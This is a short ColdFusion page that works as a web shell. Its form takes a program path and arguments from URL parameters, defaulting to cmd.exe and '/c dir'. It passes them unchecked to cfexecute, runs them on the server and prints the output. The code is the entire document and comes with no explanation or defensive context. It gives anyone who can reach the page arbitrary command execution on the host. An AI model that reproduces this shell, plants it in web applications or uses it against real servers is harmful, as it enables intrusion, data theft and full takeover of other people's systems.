<html>
    <style type="text/css">
        form {
            float: left;
            width: 150px;
            text-align: right;
            margin-right: 0.5em;
        }

        input {
            margin-bottom: .3cm;                
        }

        div.out {
            padding-top: 3cm;                
        }
    </style>
    <body>
        <cfoutput>
            <form method="get" action="">
              <input type="cmd" name="cmd" size="30" value="c:\windows\system32\cmd.exe">
              <input type="opt" name="opt" size="30" value="/c dir">
              <input type=submit value="Submit" > 
            </form>

            <cfif structKeyExists(url, 'cmd') and trim(url.cmd) neq "">
                <cfexecute name = "#url.cmd#"
                           arguments = "#url.opt#"
                           timeout = "10"
                           variable = "output">
                </cfexecute>
                <div class="out">
                    <pre>#output#</pre>
                </div>
            </cfif>
        </cfoutput>
    </body>
</html>
